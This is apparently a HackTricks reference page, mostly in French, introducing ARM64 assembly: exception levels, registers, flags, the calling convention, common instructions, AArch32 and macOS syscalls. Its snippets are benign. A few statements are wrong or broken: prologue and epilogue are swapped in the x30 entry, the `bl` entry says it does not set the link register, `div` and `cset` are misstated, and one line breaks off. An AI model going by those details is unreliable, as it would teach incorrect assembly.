# Introduction à ARM64v8

{{#include ../../../banners/hacktricks-training.md}}


## **Niveaux d'Exception - EL (ARM64v8)**

Dans l'architecture ARMv8, les niveaux d'exécution, appelés Exception Levels (ELs), définissent le niveau de privilège et les capacités de l'environnement d'exécution. Il y a quatre niveaux d'exception, allant de EL0 à EL3, chacun ayant un rôle différent :

1. **EL0 - User Mode** :
- C'est le niveau le moins privilégié et il est utilisé pour exécuter du code d'application classique.
- Les applications s'exécutant en EL0 sont isolées les unes des autres et du logiciel système, améliorant la sécurité et la stabilité.
2. **EL1 - Operating System Kernel Mode** :
- La plupart des noyaux d'OS fonctionnent à ce niveau.
- EL1 a plus de privilèges que EL0 et peut accéder aux ressources système, mais avec certaines restrictions pour garantir l'intégrité du système. On passe de EL0 à EL1 avec l'instruction SVC.
3. **EL2 - Hypervisor Mode** :
- Ce niveau est utilisé pour la virtualisation. Un hyperviseur s'exécutant en EL2 peut gérer plusieurs systèmes d'exploitation (chacun en EL1) sur le même matériel physique.
- EL2 fournit des fonctionnalités d'isolation et de contrôle des environnements virtualisés.
- Ainsi des applications de machines virtuelles comme Parallels peuvent utiliser le `hypervisor.framework` pour interagir avec EL2 et exécuter des machines virtuelles sans nécessiter d'extensions noyau.
- Pour passer de EL1 à EL2, l'instruction `HVC` est utilisée.
4. **EL3 - Secure Monitor Mode** :
- C'est le niveau le plus privilégié et il est souvent utilisé pour le démarrage sécurisé et les environnements d'exécution de confiance.
- EL3 peut gérer et contrôler les accès entre les états secure et non-secure (comme secure boot, trusted OS, etc.).
- Il était utilisé pour KPP (Kernel Patch Protection) dans macOS, mais il n'est plus utilisé.
- EL3 n'est plus utilisé par Apple.
- La transition vers EL3 se fait typiquement avec l'instruction `SMC` (Secure Monitor Call).

L'utilisation de ces niveaux permet de gérer de manière structurée et sécurisée différents aspects du système, des applications utilisateurs aux logiciels système les plus privilégiés. L'approche d'ARMv8 pour les niveaux de privilège aide à isoler efficacement les composants système, renforçant ainsi la sécurité et la robustesse du système.

## **Registres (ARM64v8)**

ARM64 possède **31 registres généraux**, étiquetés `x0` à `x30`. Chacun peut stocker une valeur **64 bits** (8 octets). Pour les opérations nécessitant uniquement des valeurs 32 bits, les mêmes registres peuvent être accédés en mode 32 bits avec les noms `w0` à `w30`.

1. **`x0`** à **`x7`** - Ce sont typiquement des registres temporaires et servent au passage des paramètres aux sous-routines.
- **`x0`** porte aussi la donnée de retour d'une fonction.
2. **`x8`** - Dans le noyau Linux, `x8` est utilisé comme numéro de syscall pour l'instruction `svc`. **Dans macOS, c'est x16 qui est utilisé !**
3. **`x9`** à **`x15`** - D'autres registres temporaires, souvent utilisés pour des variables locales.
4. **`x16`** et **`x17`** - **Intra-procedural Call Registers**. Registres temporaires pour des valeurs immédiates. Ils sont aussi utilisés pour des appels de fonction indirects et des stubs PLT (Procedure Linkage Table).
- **`x16`** est utilisé comme **numéro d'appel système** pour l'instruction **`svc`** dans **macOS**.
5. **`x18`** - **Registre plateforme**. Il peut être utilisé comme registre général, mais sur certaines plateformes, ce registre est réservé pour des usages spécifiques à la plateforme : pointeur vers le thread environment block courant sous Windows, ou vers la structure de tâche en cours d'exécution dans le noyau linux.
6. **`x19`** à **`x28`** - Ce sont des registres sauvegardés par le callee. Une fonction doit préserver les valeurs de ces registres pour son appelant, donc ils sont stockés sur la pile et restaurés avant de retourner à l'appelant.
7. **`x29`** - **Frame pointer** pour suivre le cadre de pile. Lorsqu'un nouveau cadre de pile est créé parce qu'une fonction est appelée, le registre **`x29`** est **sauvegardé dans la pile** et la **nouvelle** adresse du frame pointer (l'adresse de **`sp`**) est **stockée dans ce registre**.
- Ce registre peut aussi être utilisé comme **registre général**, bien qu'il soit généralement employé comme référence pour les **variables locales**.
8. **`x30`** ou **`lr`** - **Link register**. Il contient l'**adresse de retour** lorsqu'une instruction `BL` (Branch with Link) ou `BLR` (Branch with Link to Register) est exécutée en stockant la valeur du **`pc`** dans ce registre.
- Il peut aussi être utilisé comme n'importe quel autre registre.
- Si la fonction courante va appeler une nouvelle fonction et donc écraser `lr`, elle le stockera sur la pile au début ; ceci est l'épilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Sauvegarde `fp` et `lr`, génère de l'espace et obtient un nouveau `fp`) et le récupérera à la fin ; ceci est le prologue (`ldp x29, x30, [sp], #48; ret` -> Récupère `fp` et `lr` et retourne).
9. **`sp`** - **Stack pointer**, utilisé pour suivre le sommet de la pile.
- la valeur de **`sp`** doit toujours être maintenue au moins avec un **alignement quadword**, sinon une exception d'alignement peut survenir.
10. **`pc`** - **Program counter**, qui pointe vers la prochaine instruction. Ce registre ne peut être mis à jour que via des générations d'exceptions, des retours d'exception et des branchements. Les seules instructions ordinaires qui peuvent lire ce registre sont les branch with link (BL, BLR) pour stocker l'adresse **`pc`** dans **`lr`** (Link Register).
11. **`xzr`** - **Zero register**. Aussi appelé **`wzr`** dans sa forme **32 bits**. Peut être utilisé pour obtenir facilement la valeur zéro (opération courante) ou pour effectuer des comparaisons en utilisant **`subs`** comme **`subs XZR, Xn, #10`** stockant le résultat nulle part (dans **`xzr`**).

Les registres **`Wn`** sont la version **32 bits** du registre **`Xn`**.

> [!TIP]
> Les registres de X0 à X18 sont volatils, ce qui signifie que leurs valeurs peuvent être modifiées par des appels de fonction et des interruptions. Cependant, les registres de X19 à X28 sont non-volatils, ce qui signifie que leurs valeurs doivent être préservées à travers les appels de fonction ("callee saved").

### Registres SIMD et virgule flottante

De plus, il existe **32 autres registres de 128 bits** qui peuvent être utilisés dans des opérations SIMD optimisées et pour effectuer de l'arithmétique en virgule flottante. Ceux-ci s'appellent les registres Vn bien qu'ils puissent aussi opérer en **64**-bit, **32**-bit, **16**-bit et **8**-bit et alors ils sont appelés **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** et **`Bn`**.

### Registres Système

**Il existe des centaines de registres système**, aussi appelés registres à usage spécial (SPRs), utilisés pour **surveiller** et **contrôler** le comportement des **processeurs**.\
Ils ne peuvent être lus ou écrits qu'en utilisant les instructions spéciales dédiées **`mrs`** et **`msr`**.

Les registres spéciaux **`TPIDR_EL0`** et **`TPIDDR_EL0`** sont souvent rencontrés lors du reversing engineering. Le suffixe `EL0` indique le **niveau d'exception minimal** à partir duquel le registre peut être accédé (dans ce cas EL0 est le niveau d'exception régulier dans lequel s'exécutent les programmes classiques).\
Ils sont souvent utilisés pour stocker l'**adresse de base du thread-local storage** de la mémoire. Habituellement le premier est lisible et modifiable pour les programmes s'exécutant en EL0, mais le second peut être lu depuis EL0 et écrit depuis EL1 (comme le noyau).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** contient plusieurs composantes du processus sérialisées dans le registre spécial **`SPSR_ELx`** visible par le système d'exploitation, X étant le **niveau de permission** de l'exception déclenchée (cela permet de récupérer l'état du processus lorsque l'exception prend fin).\
Voici les champs accessibles :

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Les drapeaux de condition **`N`**, **`Z`**, **`C`** et **`V`** :
- **`N`** signifie que l'opération donne un résultat négatif
- **`Z`** signifie que l'opération donne zéro
- **`C`** signifie que l'opération a généré une retenue (carry)
- **`V`** signifie que l'opération a produit un overflow signé :
- La somme de deux nombres positifs donne un résultat négatif.
- La somme de deux nombres négatifs donne un résultat positif.
- Dans une soustraction, lorsqu'un grand nombre négatif est soustrait d'un petit nombre positif (ou l'inverse), et que le résultat ne peut pas être représenté dans la plage du nombre de bits donné.
- Évidemment le processeur ne sait pas si l'opération est signée ou non, donc il vérifiera C et V dans les opérations et indiquera si une retenue est survenue que l'opération soit signée ou non.

> [!WARNING]
> Toutes les instructions ne mettent pas à jour ces drapeaux. Certaines comme **`CMP`** ou **`TST`** le font, et d'autres qui ont un suffixe s comme **`ADDS`** le font aussi.

- Le drapeau **largeur de registre courante (`nRW`)** : Si ce drapeau vaut 0, le programme s'exécutera dans l'état d'exécution AArch64 une fois repris.
- Le **niveau d'Exception courant** (**`EL`**) : Un programme régulier s'exécutant en EL0 aura la valeur 0.
- Le drapeau de **single stepping** (**`SS`**) : Utilisé par les débogueurs pour exécuter instruction par instruction en positionnant le drapeau SS à 1 dans **`SPSR_ELx`** via une exception. Le programme exécutera un pas et déclenchera une exception de single step.
- Le drapeau d'**état d'exception illégale** (**`IL`**) : Il est utilisé pour marquer quand un logiciel privilégié effectue un transfert d'exception de niveau invalide ; ce drapeau est mis à 1 et le processeur déclenche une exception d'état illégal.
- Les drapeaux **`DAIF`** : Ces drapeaux permettent à un programme privilégié de masquer sélectivement certaines exceptions externes.
- Si **`A`** vaut 1 cela signifie que les **asynchronous aborts** seront masqués. Le **`I`** configure la réponse aux requêtes d'interruptions matérielles externes (IRQs). et le **F** est lié aux **Fast Interrupt Requests** (FIRs).
- Les drapeaux de **sélection du pointeur de pile** (**`SPS`**) : Les programmes privilégiés s'exécutant en EL1 et au-dessus peuvent basculer entre l'utilisation de leur propre registre de pointeur de pile et celui du modèle utilisateur (par ex. entre `SP_EL1` et `EL0`). Ce basculement s'effectue en écrivant dans le registre spécial **`SPSel`**. Cela ne peut pas être fait depuis EL0.

## **Convention d'appel (ARM64v8)**

La convention d'appel ARM64 spécifie que les **huit premiers paramètres** d'une fonction sont passés dans les registres **`x0` à `x7`**. Les paramètres **supplémentaires** sont passés sur la **pile**. La **valeur de retour** est renvoyée dans le registre **`x0`**, ou dans **`x1`** également **si elle fait 128 bits**. Les registres **`x19`** à **`x30`** et **`sp`** doivent être **préservés** à travers les appels de fonction.

Lors de la lecture d'une fonction en assembleur, cherchez le **prologue** et l'**épilogue** de la fonction. Le **prologue** implique généralement la **sauvegarde du frame pointer (`x29`)**, la **mise en place** d'un **nouveau frame pointer**, et l'**allocation d'espace sur la pile**. L'**épilogue** implique généralement la **restauration du frame pointer sauvegardé** et le **retour** de la fonction.

### Convention d'appel en Swift

Swift a sa propre **convention d'appel** que l'on peut trouver sur [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Instructions courantes (ARM64v8)**

Les instructions ARM64 ont généralement le **format `opcode dst, src1, src2`**, où **`opcode`** est l'**opération** à effectuer (comme `add`, `sub`, `mov`, etc.), **`dst`** est le registre **destination** où le résultat sera stocké, et **`src1`** et **`src2`** sont les **registres source**. Des valeurs immédiates peuvent aussi être utilisées à la place des registres source.

- **`mov`** : **Déplacer** une valeur d'un **registre** à un autre.
- Exemple : `mov x0, x1` — Déplace la valeur de `x1` vers `x0`.
- **`ldr`** : **Charger** une valeur depuis la **mémoire** dans un **registre**.
- Exemple : `ldr x0, [x1]` — Charge une valeur depuis l'adresse mémoire pointée par `x1` dans `x0`.
- **Mode offset** : Un offset affectant le pointeur d'origine est indiqué, par exemple :
- `ldr x2, [x1, #8]`, ceci chargera dans x2 la valeur à l'adresse x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, ceci chargera dans x2 un objet depuis le tableau x0, à la position x1 (index) * 4
- **Mode pré-indexé** : Cela applique le calcul à l'origine, récupère le résultat et stocke aussi la nouvelle origine dans l'origine.
- `ldr x2, [x1, #8]!`, ceci chargera `x1 + 8` dans `x2` et stockera dans x1 le résultat de `x1 + 8`
- `str lr, [sp, #-4]!`, Sauvegarde le link register dans sp et met à jour le registre sp
- **Mode post-index** : C'est comme le précédent mais l'adresse mémoire est accédée puis l'offset est calculé et stocké.
- `ldr x0, [x1], #8`, charge `x1` dans `x0` et met à jour x1 avec `x1 + 8`
- **Adressage relatif au PC** : Dans ce cas l'adresse à charger est calculée relative au registre PC
- `ldr x1, =_start`, Ceci chargera dans x1 l'adresse où le symbole `_start` commence en relation avec le PC courant.
- **`str`** : **Stocker** une valeur d'un **registre** dans la **mémoire**.
- Exemple : `str x0, [x1]` — Stocke la valeur de `x0` à l'adresse mémoire pointée par `x1`.
- **`ldp`** : **Load Pair of Registers**. Cette instruction **charge deux registres** depuis des **emplacements mémoire consécutifs**. L'adresse mémoire est typiquement formée en ajoutant un offset à la valeur d'un autre registre.
- Exemple : `ldp x0, x1, [x2]` — Charge `x0` et `x1` depuis les adresses mémoire `x2` et `x2 + 8`, respectivement.
- **`stp`** : **Store Pair of Registers**. Cette instruction **stocke deux registres** dans des **emplacements mémoire consécutifs**. L'adresse mémoire est typiquement formée en ajoutant un offset à la valeur d'un autre registre.
- Exemple : `stp x0, x1, [sp]` — Stocke `x0` et `x1` aux adresses mémoire `sp` et `sp + 8`, respectivement.
- `stp x0, x1, [sp, #16]!` — Stocke `x0` et `x1` aux adresses `sp+16` et `sp + 24`, respectivement, et met à jour `sp` avec `sp+16`.
- **`add`** : **Additionner** les valeurs de deux registres et stocker le résultat dans un registre.
- Syntaxe : add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destination
- Xn2 -> Opérande 1
- Xn3 | #imm -> Opérande 2 (registre ou immédiat)
- \[shift #N | RRX] -> Effectuer un décalage ou appeler RRX
- Exemple : `add x0, x1, x2` — Ajoute les valeurs dans `x1` et `x2` et stocke le résultat dans `x0`.
- `add x5, x5, #1, lsl #12` — Cela équivaut à 4096 (un 1 décalé 12 fois) -> 1 0000 0000 0000 0000
- **`adds`** : Effectue un `add` et met à jour les flags.
- **`sub`** : **Soustraire** les valeurs de deux registres et stocker le résultat dans un registre.
- Voir la **syntaxe** de **`add`**.
- Exemple : `sub x0, x1, x2` — Soustrait la valeur dans `x2` de `x1` et stocke le résultat dans `x0`.
- **`subs`** : Comme `sub` mais met à jour les flags.
- **`mul`** : **Multiplier** les valeurs de **deux registres** et stocker le résultat dans un registre.
- Exemple : `mul x0, x1, x2` — Multiplie les valeurs de `x1` et `x2` et stocke le résultat dans `x0`.
- **`div`** : **Diviser** la valeur d'un registre par un autre et stocker le résultat dans un registre.
- Exemple : `div x0, x1, x2` — Divise la valeur dans `x1` par `x2` et stocke le résultat dans `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`** :
- **Logical shift left** : Ajoute des 0 à la fin en décalant les autres bits vers l'avant (multiplie par 2^n)
- **Logical shift right** : Ajoute des 0 au début en décalant les autres bits vers l'arrière (divise par 2^n pour les non signés)
- **Arithmetic shift right** : Comme **`lsr`**, mais au lieu d'ajouter des 0 si le bit de poids fort est à 1, on ajoute des 1 (division par 2^n en signé)
- **Rotate right** : Comme **`lsr`** mais ce qui est retiré à droite est ajouté à gauche
- **Rotate Right with Extend** : Comme **`ror`**, mais avec le flag carry comme le "bit de poids fort". Ainsi le flag carry est déplacé au bit 31 et le bit retiré va dans le flag carry.
- **`bfm`** : **Bit Field Move**, ces opérations **copient les bits `0...n`** d'une valeur et les placent dans les positions **`m..m+n`**. Le **`#s`** spécifie la **position du bit le plus à gauche** et **`#r`** la quantité de rotation à droite.
- Bitfield move : `BFM Xd, Xn, #r`
- Signed Bitfield move : `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move : `UBFM Xd, Xn, #r, #s`
- **Extraction et insertion de champ de bits :** Copier un champ de bits depuis un registre et le copier dans un autre registre.
- **`BFI X1, X2, #3, #4`** Insère 4 bits de X2 à partir du 3ème bit dans X1
- **`BFXIL X1, X2, #3, #4`** Extrait à partir du 3ème bit de X2 quatre bits et les copie dans X1
- **`SBFIZ X1, X2, #3, #4`** Signe-étend 4 bits de X2 et les insère dans X1 à partir du bit 3 en mettant à zéro les bits de droite
- **`SBFX X1, X2, #3, #4`** Extrait 4 bits commençant au bit 3 de X2, signe-étend et place le résultat dans X1
- **`UBFIZ X1, X2, #3, #4`** Zéro-étend 4 bits de X2 et les insère dans X1 à partir du bit 3 en mettant à zéro les bits de droite
- **`UBFX X1, X2, #3, #4`** Extrait 4 bits commençant au bit 3 de X2 et place le résultat zéro-étendu dans X1.
- **Sign Extend To X :** Étend le signe (ou ajoute des 0 pour la version non signée) d'une valeur pour pouvoir effectuer des opérations avec :
- **`SXTB X1, W2`** Étend le signe d'un octet **de W2 vers X1** (`W2` est la moitié de `X2`) pour remplir 64 bits
- **`SXTH X1, W2`** Étend le signe d'un nombre 16 bits **de W2 vers X1** pour remplir 64 bits
- **`SXTW X1, W2`** Étend le signe d'un mot **de W2 vers X1** pour remplir 64 bits
- **`UXTB X1, W2`** Ajoute des 0 (unsigned) à un octet **de W2 vers X1** pour remplir 64 bits
- **`extr` :** Extrait des bits d'une paire de registres concaténée spécifiée.
- Exemple : `EXTR W3, W2, W1, #3` Cela concaténera W1+W2 et prendra **du bit 3 de W2** jusqu'au bit 3 de W1 et le stockera dans W3.
- **`cmp`** : **Comparer** deux registres et positionner les flags conditionnels. C'est un **alias de `subs`** mettant le registre destination au registre zéro. Utile pour savoir si `m == n`.
- Il supporte la **même syntaxe que `subs`**
- Exemple : `cmp x0, x1` — Compare les valeurs dans `x0` et `x1` et met à jour les flags conditionnels en conséquence.
- **`cmn`** : **Compare negative** l'opérande. Ici c'est un **alias de `adds`** et supporte la même syntaxe. Utile pour savoir si `m == -n`.
- **`ccmp`** : Comparaison conditionnelle ; c'est une comparaison qui ne sera effectuée que si une comparaison précédente était vraie et qui mettra spécifiquement les bits nzcv.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> si x1 != x2 et x3 < x4, sauter vers func
- Ceci parce que **`ccmp`** ne sera exécuté que si le **`cmp`** précédent était un `NE`, sinon les bits `nzcv` seront mis à 0 (ce qui ne satisfera pas la comparaison `blt`).
- Cela peut aussi être utilisé comme `ccmn` (même chose mais négatif, comme `cmp` vs `cmn`).
- **`tst`** : Vérifie si l'un des bits de la comparaison est à 1 (fonctionne comme un `ANDS` sans stocker le résultat). Utile pour tester un registre avec une valeur et vérifier si l'un des bits indiqués est à 1.
- Exemple : `tst X1, #7` Vérifie si l'un des 3 derniers bits de X1 est à 1
- **`teq`** : Opération XOR en ignorant le résultat
- **`b`** : Branchement inconditionnel
- Exemple : `b myFunction`
- Notez que cela ne remplit pas le link register avec l'adresse de retour (non adapté pour des appels de sous-routines qui doivent revenir)
- **`bl`** : **Branch** with link, utilisé pour **appeler** une **sous-routine**. Stocke l'**adresse de retour dans `x30`**.
- Exemple : `bl myFunction` — Appelle la fonction `myFunction` et stocke l'adresse de retour dans `x30`.
- Notez que cela ne remplit pas le link register avec l'adresse de retour (non adapté pour des appels de sous-routines qui doivent revenir)
- **`blr`** : **Branch** with Link to Register, utilisé pour **appeler** une **sous-routine** où la cible est **spécifiée** dans un **registre**. Stocke l'adresse de retour dans `x30`. (Ceci est
- Exemple : `blr x1` — Appelle la fonction dont l'adresse est contenue dans `x1` et stocke l'adresse de retour dans `x30`.
- **`ret`** : **Retour** de sous-routine, typiquement en utilisant l'adresse dans **`x30`**.
- Exemple : `ret` — Retourne de la sous-routine courante en utilisant l'adresse de retour dans `x30`.
- **`b.<cond>`** : Branches conditionnels
- **`b.eq`** : **Branch if equal**, basé sur l'instruction `cmp` précédente.
- Exemple : `b.eq label` — Si la précédente instruction `cmp` a trouvé deux valeurs égales, ceci saute à `label`.
- **`b.ne`** : **Branch if Not Equal**. Cette instruction vérifie les flags conditionnels (mis par une instruction de comparaison précédente), et si les valeurs comparées n'étaient pas égales, elle branche vers un label ou une adresse.
- Exemple : Après un `cmp x0, x1`, `b.ne label` — Si les valeurs dans `x0` et `x1` n'étaient pas égales, ceci saute à `label`.
- **`cbz`** : **Compare and Branch on Zero**. Cette instruction compare un registre à zéro, et si égal, elle branche vers un label ou une adresse.
- Exemple : `cbz x0, label` — Si la valeur dans `x0` est zéro, ceci saute à `label`.
- **`cbnz`** : **Compare and Branch on Non-Zero**. Cette instruction compare un registre à zéro, et si non égal, elle branche vers un label ou une adresse.
- Exemple : `cbnz x0, label` — Si la valeur dans `x0` est non-zéro, ceci saute à `label`.
- **`tbnz`** : Test bit and branch on nonzero
- Exemple : `tbnz x0, #8, label`
- **`tbz`** : Test bit and branch on zero
- Exemple : `tbz x0, #8, label`
- **Opérations de sélection conditionnelle** : Ce sont des opérations dont le comportement varie selon les bits conditionnels.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Si vrai, X0 = X1, sinon X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Si vrai, Xd = Xn, sinon Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Si vrai, Xd = Xn + 1, sinon Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Si vrai, Xd = Xn, sinon Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Si vrai, Xd = NOT(Xn), sinon Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Si vrai, Xd = Xn, sinon Xd = - Xm
- `cneg Xd, Xn, cond` -> Si vrai, Xd = - Xn, sinon Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Si vrai, Xd = 1, sinon Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Si vrai, Xd = \<all 1>, sinon Xd = 0
- **`adrp`** : Calcule l'adresse de page d'un symbole et la stocke dans un registre.
- Exemple : `adrp x0, symbol` — Calcule l'adresse de page de `symbol` et la stocke dans `x0`.
- **`ldrsw`** : **Charger** une valeur signée **32 bits** depuis la mémoire et la **signe-étendre à 64** bits. Utilisé pour des cas SWITCH courants.
- Exemple : `ldrsw x0, [x1]` — Charge une valeur 32 bits signée depuis l'adresse pointée par `x1`, la signe-étend à 64 bits et la stocke dans `x0`.
- **`stur`** : **Stocker la valeur d'un registre dans une adresse mémoire**, en utilisant un offset depuis un autre registre.
- Exemple : `stur x0, [x1, #4]` — Stocke la valeur de `x0` dans l'adresse mémoire située 4 octets après l'adresse contenue dans `x1`.
- **`svc`** : Effectuer un **system call**. Cela signifie "Supervisor Call". Quand le processeur exécute cette instruction, il **passe du mode utilisateur au mode noyau** et saute vers un emplacement spécifique en mémoire où le code de gestion des syscalls du noyau est situé.

- Exemple :

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Prologue de fonction**

1. **Sauvegarder le registre de lien et le pointeur de trame sur la pile** :
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Configurer le nouveau pointeur de cadre**: `mov x29, sp` (configure le nouveau pointeur de cadre pour la fonction courante)  
3. **Allouer de l'espace sur la pile pour les variables locales** (si nécessaire): `sub sp, sp, <size>` (où `<size>` est le nombre d'octets nécessaires)

### **Épilogue de la fonction**

1. **Désallouer les variables locales (si elles ont été allouées)**: `add sp, sp, <size>`  
2. **Restaurer le registre de lien et le pointeur de cadre**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Retour**: `ret` (renvoie le contrôle à l'appelant en utilisant l'adresse dans le link register)

## ARM Common Memory Protections

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## AARCH32 Execution State

Armv8-A support the execution of 32-bit programs. **AArch32** can run in one of **two instruction sets**: **`A32`** and **`T32`** and can switch between them via **`interworking`**.\
**Les programmes 64 bits privilégiés** peuvent planifier l'**exécution de programmes 32 bits** en effectuant un transfert de niveau d'exception vers le niveau 32 bits de moindre privilège.\
Notez que la transition de 64 bits vers 32 bits s'effectue avec un niveau d'exception inférieur (par exemple un programme 64 bits en EL1 déclenchant un programme en EL0). Ceci se fait en mettant **le bit 4 de** le registre spécial **`SPSR_ELx`** **à 1** lorsque le thread de processus `AArch32` est prêt à être exécuté et le reste de `SPSR_ELx` contient le CPSR du programme `AArch32`. Ensuite, le processus privilégié appelle l'instruction **`ERET`** pour que le processeur bascule en **`AArch32`**, entrant en A32 ou T32 selon le CPSR**.**

The **`interworking`** occurs using the J and T bits of CPSR. `J=0` and `T=0` means **`A32`** and `J=0` and `T=1` means **T32**. This basically traduces on setting the **lowest bit to 1** to indicate the instruction set is T32.\
Ceci est défini lors des **interworking branch instructions,** mais peut aussi être défini directement par d'autres instructions lorsque le PC est utilisé comme registre de destination. Exemple:

Another example:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registres

Il y a 16 registres 32 bits (r0-r15). **De r0 à r14** peuvent être utilisés pour **n'importe quelle opération**, cependant certains sont généralement réservés :

- **`r15`** : compteur de programme (toujours). Contient l'adresse de l'instruction suivante. En A32 adresse actuelle + 8, en T32 adresse actuelle + 4.
- **`r11`** : Frame Pointer
- **`r12`** : Intra-procedural call register
- **`r13`** : Stack Pointer (Notez que la pile est toujours alignée sur 16 octets)
- **`r14`** : Link Register

De plus, les registres sont sauvegardés dans des **`banked registries`**. Ce sont des emplacements qui stockent les valeurs des registres, permettant d'effectuer des **changements de contexte rapides** lors de la gestion des exceptions et des opérations privilégiées pour éviter la nécessité de sauvegarder et restaurer manuellement les registres à chaque fois.\
Ceci est fait en **sauvegardant l'état du processeur du `CPSR` vers le `SPSR`** du mode processeur vers lequel l'exception est prise. Au retour d'exception, le **`CPSR`** est restauré depuis le **`SPSR`**.

### CPSR - Registre d'état courant du programme

En AArch32, le CPSR fonctionne de manière similaire à **`PSTATE`** en AArch64 et est également stocké dans **`SPSR_ELx`** lorsqu'une exception est prise, pour restaurer l'exécution ultérieurement :

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Les champs sont divisés en plusieurs groupes :

- Application Program Status Register (APSR) : drapeaux arithmétiques et accessible depuis EL0
- Execution State Registers : comportement du processus (géré par l'OS).

#### Registre d'état du programme d'application (APSR)

- Les drapeaux **`N`**, **`Z`**, **`C`**, **`V`** (comme en AArch64)
- Le drapeau **`Q`** : il est mis à 1 chaque fois qu'une **saturation entière** se produit lors de l'exécution d'une instruction arithmétique saturante spécialisée. Une fois à **`1`**, il conserve cette valeur jusqu'à ce qu'il soit manuellement remis à 0. De plus, aucune instruction ne vérifie implicitement sa valeur ; il faut la lire explicitement.
- Les drapeaux **`GE`** (Greater than or equal) : ils sont utilisés dans les opérations SIMD (Single Instruction, Multiple Data), telles que "parallel add" et "parallel subtract". Ces opérations permettent de traiter plusieurs points de données en une seule instruction.

Par exemple, l'instruction **`UADD8`** **additionne quatre paires d'octets** (provenant de deux opérandes 32 bits) en parallèle et stocke les résultats dans un registre 32 bits. Elle **met ensuite à jour les drapeaux `GE` dans l'`APSR`** en fonction de ces résultats. Chaque drapeau GE correspond à l'une des additions d'octets, indiquant si l'addition pour cette paire d'octets a **débordé**.

L'instruction **`SEL`** utilise ces drapeaux GE pour effectuer des actions conditionnelles.

#### Registres d'état d'exécution

- Les bits **`J`** et **`T`** : **`J`** doit être 0 ; si **`T`** est 0, l'ensemble d'instructions A32 est utilisé, s'il est 1, c'est T32 qui est utilisé.
- Registre d'état du bloc IT (`ITSTATE`) : il s'agit des bits 10-15 et 25-26. Ils stockent les conditions pour les instructions à l'intérieur d'un groupe préfixé par **`IT`**.
- Bit **`E`** : indique l'**endianness**.
- Bits Mode et Exception Mask (0-4) : ils déterminent l'état d'exécution actuel. Le 5e indique si le programme s'exécute en 32 bits (1) ou 64 bits (0). Les autres 4 représentent le **mode d'exception actuellement utilisé** (lorsqu'une exception se produit et est traitée). La valeur indiquée **détermine la priorité actuelle** au cas où une autre exception serait déclenchée pendant le traitement.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`** : Certaines exceptions peuvent être désactivées en utilisant les bits **`A`**, `I`, `F`. Si **`A`** est 1, cela signifie que des **asynchronous aborts** seront déclenchés. Le bit **`I`** configure la réponse aux **Interrupts Requests** matérielles externes (IRQs). Le bit `F` est lié aux **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Check out [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) or run `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls will have **x16 > 0**.

### Mach Traps

Check out in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) the `mach_trap_table` and in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) the prototypes. Le nombre max de Mach traps est `MACH_TRAP_TABLE_COUNT` = 128. Mach traps will have **x16 < 0**, so you need to call the numbers from the previous list with a **minus**: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.

You can also check **`libsystem_kernel.dylib`** in a disassembler to find how to call these (and BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.

> [!TIP]
> Sometimes it's easier to check the **decompiled** code from **`libsystem_kernel.dylib`** **than** checking the **source code** because the code of several syscalls (BSD and Mach) are generated via scripts (check comments in the source code) while in the dylib you can find what is being called.

### machdep calls

XNU supports another type of calls called machine dependent. The numbers of these calls depends on the architecture and neither the calls or numbers are guaranteed to remain constant.

### comm page

This is a kernel owner memory page that is mapped into the address scape of every users process. It's meant to make the transition from user mode to kernel space faster than using syscalls for kernel services that are used so much the this transition would be vey inneficient.

For example the call `gettimeofdate` reads the value of `timeval` directly from the comm page.

### objc_msgSend

It's super common to find this function used in Objective-C or Swift programs. This function allows to call a method of an objective-C object.

